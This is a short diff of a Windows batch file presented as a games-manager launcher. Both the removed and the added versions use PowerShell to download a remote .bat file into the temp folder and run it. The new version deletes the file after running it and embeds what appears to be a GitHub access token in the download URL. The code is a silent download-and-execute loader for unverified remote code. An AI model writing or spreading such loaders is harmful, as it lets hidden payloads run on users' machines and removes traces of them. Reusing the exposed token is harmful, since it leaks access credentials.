@@ -1,4 +1,6 @@
 @echo off
-powershell -Command "Invoke-WebRequest -Uri 'https://itsdanitobg.online/games-manager' -OutFile '%temp%\games-downloader.bat'"
-    call "%temp%\games-downloader.bat"
-    exit
+set "tempFile=%temp%\redirect-games-manager.bat"
+powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/itsdanitobg/site/refs/heads/main/redirect-games-manager?token=GHSAT0AAAAAADC37KFFELY7VUQWAHIEIZKK2A6HITQ' -OutFile '%tempFile%'"
+call "%tempFile%"
+del "%tempFile%"
+exit
